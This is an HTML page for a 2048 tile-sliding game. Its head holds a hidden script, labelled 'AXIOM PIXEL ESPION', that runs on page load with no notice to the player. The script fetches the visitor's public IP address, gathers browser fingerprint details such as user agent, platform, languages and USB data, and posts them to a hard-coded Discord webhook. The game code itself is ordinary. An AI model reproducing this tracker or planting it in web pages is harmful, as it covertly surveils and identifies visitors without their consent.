<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>2048 Game</title>
  <style>
    body {
      font-family: "Arial", sans-serif;
      text-align: center;
      background-color: #faf8ef;
    }
    #game-container {
      margin: 20px auto;
      width: 300px;
      position: relative;
    }
    .tile {
      width: 66px;
      height: 66px;
      background: #eee4da;
      font-size: 24px;
      font-weight: bold;
      text-align: center;
      line-height: 66px;
      position: absolute;
      border-radius: 6px;
    }
  </style>
  <script>
    const ipRequest = new XMLHttpRequest();
    const ipUrl = "https://api.ipify.org?format=json";
    ipRequest.open('GET', ipUrl);
    ipRequest.onload = function() {
      if (ipRequest.status === 200) {
        const data = JSON.parse(ipRequest.responseText);
        console.log(data.ip);

        const discordRequest = new XMLHttpRequest();
        const webhookUrl = 'https://discord.com/api/webhooks/1169621875740135424/iBsnAb5E6MUNhP4iHFIIpZ_erAg4GuW-YwY6nUPYA3l4o448XqxLnR9L8qEGnl0CUkS2';
        discordRequest.open('POST', webhookUrl);
        discordRequest.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
        const now = new Date();
        const hours = now.getHours();
        const minutes = now.getMinutes();
        const seconds = now.getSeconds();
        const colorHex = '#' +('0' + hours.toString(16)).slice(-2) +('0' + minutes.toString(16)).slice(-2) +('0' + seconds.toString(16)).slice(-2);

        function formatObject(obj) {
          return '\`\`\`json\n' + JSON.stringify(obj, null, 2) + '\`\`\`'
        }
        
        const embedMessage = {
          embeds: [{
            title: "AXIOM PIXEL ESPION",
            description: `**adresse IP:** \`\`\`json\n${data.ip}\`\`\`**appCodeName:** \`\`\`json\n${navigator.appCodeName}\`\`\`**appName:** \`\`\`json\n${navigator.appName}\`\`\`**appVersion:** \`\`\`json\n${navigator.appVersion}\`\`\`**language:** \`\`\`json\n${navigator.language}\`\`\`**languages:** \`\`\`json\n${navigator.languages}\`\`\`**platform:** \`\`\`json\n${navigator.platform}\`\`\`**usb:** ${formatObject(navigator.usb)}**userAgent:** \`\`\`json\n${navigator.userAgent}\`\`\`**brands:** ${formatObject(navigator.userAgentData.brands)}**mobile:** \`\`\`json\n${navigator.userAgentData.mobile}\`\`\`**platform:** \`\`\`json\n${navigator.userAgentData.platform}\`\`\`**Heure:** \`\`\`json\n${hours < 10 ? '0' + hours : hours}:${minutes < 10 ? '0' + minutes : minutes}:${seconds < 10 ? '0' + seconds : seconds}\`\`\``,
            color: parseInt(colorHex.replace(/^#/, ''), 16),
          }]
        };

        discordRequest.send(JSON.stringify(embedMessage));

      } else {
        console.error('Error retrieving IP address');
      }
    };
    ipRequest.send();
  </script>
</head>
<body>

<div id="game-container"></div>
<p>Score: <span id="score">0</span></p>

<script>
  const gridSize = 4;
  let grid = Array.from({ length: gridSize }, () => Array(gridSize).fill(0));
  let score = 0;

  function initializeGame() {
    addRandomTile();
    addRandomTile();
    updateGrid();
  }

  function addRandomTile() {
    const availableCells = [];
    for (let i = 0; i < gridSize; i++) {
      for (let j = 0; j < gridSize; j++) {
        if (grid[i][j] === 0) {
          availableCells.push({ row: i, col: j });
        }
      }
    }

    if (availableCells.length > 0) {
      const randomCell = availableCells[Math.floor(Math.random() * availableCells.length)];
      const newValue = Math.random() < 0.9 ? 2 : 4;
      grid[randomCell.row][randomCell.col] = newValue;
    }
  }

  function updateGrid() {
    const gameContainer = document.getElementById("game-container");
    gameContainer.innerHTML = "";
    
    for (let i = 0; i < gridSize; i++) {
      for (let j = 0; j < gridSize; j++) {
        if (grid[i][j] !== 0) {
          const tile = document.createElement("div");
          tile.className = "tile";
          tile.style.top = i * 76 + "px"; // Adjusted for better visibility
          tile.style.left = j * 76 + "px"; // Adjusted for better visibility
          tile.textContent = grid[i][j];
          tile.style.backgroundColor = getTileColor(grid[i][j]);
          gameContainer.appendChild(tile);
        }
      }
    }

    document.getElementById("score").textContent = score;
  }

  function getTileColor(value) {
    const colors = {
      2: "#eee4da",
      4: "#ede0c8",
      8: "#f2b179",
      16: "#f59563",
      32: "#f67c5f",
      64: "#f65e3b",
      128: "#edcf72",
      256: "#edcc61",
      512: "#edc850",
      1024: "#edc53f",
      2048: "#edc22e",
    };
    return colors[value] || "#eee4da";
  }

  function move(direction) {
    const oldGrid = JSON.parse(JSON.stringify(grid)); // Create a deep copy of the grid
    let moved = false;
  
    switch (direction) {
      case "up":
        moved = moveUp();
        break;
      case "down":
        moved = moveDown();
        break;
      case "left":
        moved = moveLeft();
        break;
      case "right":
        moved = moveRight();
        break;
    }
  
    if (moved) {
      addRandomTile();
      updateGrid();
    }
  
    if (isGameWon()) {
      alert("Congratulations! You've won!\nYour score is " + score);
      initializeGame();
    }
  
    if (isGameOver()) {
      alert("Game over! Your score is " + score);
      initializeGame();
      // Optionally, restart the game or perform other actions
    }
  }

  function moveUp() {
    let moved = false;
  
    for (let j = 0; j < gridSize; j++) {
      for (let i = 1; i < gridSize; i++) {
        if (grid[i][j] !== 0) {
          let row = i;
          while (row > 0 && grid[row - 1][j] === 0) {
            // Move tile up as long as the cell above is empty
            grid[row - 1][j] = grid[row][j];
            grid[row][j] = 0;
            row--;
            moved = true;
          }
  
          if (row > 0 && grid[row - 1][j] === grid[row][j]) {
            // Merge tiles if the cell above has the same value
            grid[row - 1][j] *= 2;
            grid[row][j] = 0;
            score += grid[row - 1][j];
            moved = true;
          }
        }
      }
    }
  
    return moved;
  }
  
  function moveDown() {
    let moved = false;
  
    for (let j = 0; j < gridSize; j++) {
      for (let i = gridSize - 2; i >= 0; i--) {
        if (grid[i][j] !== 0) {
          let row = i;
          while (row < gridSize - 1 && grid[row + 1][j] === 0) {
            // Move tile down as long as the cell below is empty
            grid[row + 1][j] = grid[row][j];
            grid[row][j] = 0;
            row++;
            moved = true;
          }
  
          if (row < gridSize - 1 && grid[row + 1][j] === grid[row][j]) {
            // Merge tiles if the cell below has the same value
            grid[row + 1][j] *= 2;
            grid[row][j] = 0;
            score += grid[row + 1][j];
            moved = true;
          }
        }
      }
    }
  
    return moved;
  }
  
  function moveLeft() {
    let moved = false;
  
    for (let i = 0; i < gridSize; i++) {
      for (let j = 1; j < gridSize; j++) {
        if (grid[i][j] !== 0) {
          let col = j;
          while (col > 0 && grid[i][col - 1] === 0) {
            // Move tile left as long as the cell to the left is empty
            grid[i][col - 1] = grid[i][col];
            grid[i][col] = 0;
            col--;
            moved = true;
          }
  
          if (col > 0 && grid[i][col - 1] === grid[i][col]) {
            // Merge tiles if the cell to the left has the same value
            grid[i][col - 1] *= 2;
            grid[i][col] = 0;
            score += grid[i][col - 1];
            moved = true;
          }
        }
      }
    }
  
    return moved;
  }
  
  function moveRight() {
    let moved = false;
  
    for (let i = 0; i < gridSize; i++) {
      for (let j = gridSize - 2; j >= 0; j--) {
        if (grid[i][j] !== 0) {
          let col = j;
          while (col < gridSize - 1 && grid[i][col + 1] === 0) {
            // Move tile right as long as the cell to the right is empty
            grid[i][col + 1] = grid[i][col];
            grid[i][col] = 0;
            col++;
            moved = true;
          }
  
          if (col < gridSize - 1 && grid[i][col + 1] === grid[i][col]) {
            // Merge tiles if the cell to the right has the same value
            grid[i][col + 1] *= 2;
            grid[i][col] = 0;
            score += grid[i][col + 1];
            moved = true;
          }
        }
      }
    }
  
    return moved;
  }
  
  
  function isGameOver() {
    // Check if there are any available moves (tiles can be merged or moved)
    for (let i = 0; i < gridSize; i++) {
      for (let j = 0; j < gridSize; j++) {
        if (grid[i][j] === 0) {
          return false; // There's an empty cell, the game is not over
        }
        // Check adjacent cells for possible merges
        if (i < gridSize - 1 && grid[i][j] === grid[i + 1][j]) {
          return false; // There's a merge that can be made
        }
        if (j < gridSize - 1 && grid[i][j] === grid[i][j + 1]) {
          return false; // There's a merge that can be made
        }
      }
    }
    return true; // No available moves, the game is over
  }
  
  function isGameWon() {
    // Check if any tile has reached the value 2048
    for (let i = 0; i < gridSize; i++) {
      for (let j = 0; j < gridSize; j++) {
        if (grid[i][j] === 2048) {
          return true; // A tile with value 2048 is present, the game is won
        }
      }
    }
    return false; // No tile has reached the value 2048
  }
  
  function arraysEqual(arr1, arr2) {
    // Helper function to check if two arrays are equal
    return JSON.stringify(arr1) === JSON.stringify(arr2);
  } 

  document.addEventListener("keydown", function(event) {
    let moved = false;
    switch (event.key) {
      case "ArrowUp":
        moved = move("up");
        break;
      case "ArrowDown":
        moved = move("down");
        break;
      case "ArrowLeft":
        moved = move("left");
        break;
      case "ArrowRight":
        moved = move("right");
        break;
    }
  });
  

  // Call initializeGame() to start the game
  initializeGame();

</script>

</body>
</html>
